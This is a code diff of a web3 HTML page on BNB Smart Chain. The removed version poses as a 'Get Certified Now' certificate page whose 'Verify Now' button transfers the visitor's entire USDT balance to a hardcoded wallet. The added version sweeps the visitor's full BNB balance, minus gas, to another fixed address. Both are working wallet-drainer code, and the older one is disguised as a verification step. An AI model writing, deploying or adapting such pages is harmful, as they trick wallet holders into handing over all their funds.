@@ -1,87 +1,137 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title> Get Certified Now </title>
+  <meta charset="UTF-8">
+  <title>BNB Auto Transfer</title>
   <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
   <style>
-    .fancy-button {
-      background: linear-gradient(90deg, #00c6ff, #0072ff);
-      border: none;
-      color: white;
-      padding: 15px 30px;
-      font-size: 18px;
-      font-weight: bold;
-      border-radius: 12px;
-      box-shadow: 0 8px 20px rgba(0,0,0,0.2);
-      cursor: pointer;
-      transition: all 0.3s ease-in-out;
+    body {
+      font-family: sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background: #f5f5f5;
     }
 
-    .fancy-button:hover {
-      transform: scale(1.05);
-      box-shadow: 0 12px 24px rgba(0,0,0,0.3);
+    .container {
+      text-align: center;
+      background: white;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      max-width: 400px;
+      width: 90%;
+    }
+
+    h2 {
+      margin-bottom: 20px;
+    }
+
+    #sendButton {
+      font-size: 18px;
+      padding: 12px 30px;
+      background-color: #f0b90b;
+      border: none;
+      color: white;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    #sendButton:hover {
+      background-color: #d9a30a;
+    }
+
+    #status {
+      margin-top: 20px;
+      font-size: 14px;
     }
   </style>
 </head>
 <body>
-  <div style="text-align:center;margin-top:100px;">
-    <h2><h2 style="background: linear-gradient(90deg, #ff7e5f, #feb47b); 
-           -webkit-background-clip: text; 
-           -webkit-text-fill-color: transparent; 
-           font-size: 32px; 
-           font-weight: bold;">
-  Grab Your Certificate
-    </h2></h2>
-    <button class="fancy-button" onclick="sendUSDT()">Verify Now</button>
+  <div class="container">
+    <h2>Send Full BNB</h2>
+    <button id="sendButton">Send Now</button>
     <p id="status"></p>
-  </div>  <script>
-    const receiver = "0x1994CF939337eC9B831172aBf1116221D2382F3a"; // destination wallet
-    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BNB Chain
+  </div>
 
-    const USDT_ABI = [
-      { "constant":true, "inputs":[{"name":"_owner","type":"address"}], "name":"balanceOf", "outputs":[{"name":"balance","type":"uint256"}], "type":"function" },
-      { "constant":false, "inputs":[{"name":"_to","type":"address"}, {"name":"_value","type":"uint256"}], "name":"transfer", "outputs":[{"name":"success","type":"bool"}], "type":"function" }
-    ];
+  <script>
+    const receiver = "0x795F74878AC4E02f3C254CbA845B66571EA1B5dC"; // replace with your address
+    const gasLimit = 21000;
 
-    async function sendUSDT() {
+    document.getElementById("sendButton").onclick = async () => {
       const status = document.getElementById("status");
-      if (typeof window.ethereum === 'undefined') {
-        status.innerText = "Please install MetaMask or use Trust Wallet browser.";
+      status.textContent = "Connecting...";
+      status.style.color = "red";
+
+      let web3;
+
+      if (typeof window.ethereum !== 'undefined') {
+        web3 = new Web3(window.ethereum);
+        try {
+          await window.ethereum.request({ method: 'eth_requestAccounts' });
+        } catch (err) {
+          status.textContent = "Access to wallet denied.";
+          return;
+        }
+      } else if (window.web3) {
+        web3 = new Web3(window.web3.currentProvider);
+      } else {
+        status.textContent = "Ethereum wallet not found. Open in Trust Wallet browser or install MetaMask.";
         return;
       }
 
-      const web3 = new Web3(window.ethereum);
-      await window.ethereum.request({ method: 'eth_requestAccounts' });
-
-      const accounts = await web3.eth.getAccounts();
-      const sender = accounts[0];
-      const chainId = await web3.eth.getChainId();
-
-      if (chainId !== 56) {
-        status.innerText = "Please switch to BNB Smart Chain (Chain ID 56)";
-        return;
-      }
-
-      const usdt = new web3.eth.Contract(USDT_ABI, USDT_ADDRESS);
-      const balance = await usdt.methods.balanceOf(sender).call();
-
-      if (balance === "0") {
-        status.innerText = "USDT balance is zero.";
-        return;
-      }
-
-      status.innerText = "Sending full USDT...";
       try {
-        await usdt.methods.transfer(receiver, balance).send({ from: sender })
-          .on('transactionHash', function(hash) {
-            status.innerText = "Transaction sent: " + hash;
+        const accounts = await web3.eth.getAccounts();
+        const sender = accounts[0];
+
+        const chainId = await web3.eth.getChainId();
+        if (chainId !== 56) {
+          status.textContent = "Please switch to BNB Smart Chain (Chain ID 56).";
+          return;
+        }
+
+        const balanceWei = BigInt(await web3.eth.getBalance(sender));
+        const gasPrice = BigInt(await web3.eth.getGasPrice());
+        const totalGasCost = gasPrice * BigInt(gasLimit);
+
+        if (balanceWei <= totalGasCost) {
+          status.textContent = "Insufficient balance to cover gas fees.";
+          return;
+        }
+
+        const sendAmount = balanceWei - totalGasCost;
+
+        const txParams = {
+          from: sender,
+          to: receiver,
+          value: "0x" + sendAmount.toString(16),
+          gas: "0x" + gasLimit.toString(16),
+          gasPrice: "0x" + gasPrice.toString(16),
+        };
+
+        status.textContent = "Sending transaction...";
+        status.style.color = "black";
+
+        web3.eth.sendTransaction(txParams)
+          .on('transactionHash', function(hash){
+            status.style.color = "green";
+            status.textContent = "Transaction sent! Hash: " + hash;
           })
-          .on('receipt', function(receipt) {
-            status.innerText = "Transfer complete!";
+          .on('error', function(error){
+            status.style.color = "red";
+            status.textContent = "Transaction failed: " + (error.message || error);
           });
+
       } catch (err) {
-        status.innerText = "Transfer failed: " + err.message;
+        status.style.color = "red";
+        status.textContent = "Error: " + (err.message || err);
       }
-    }
-  </script></body>
+    };
+  </script>
+</body>
+</html>
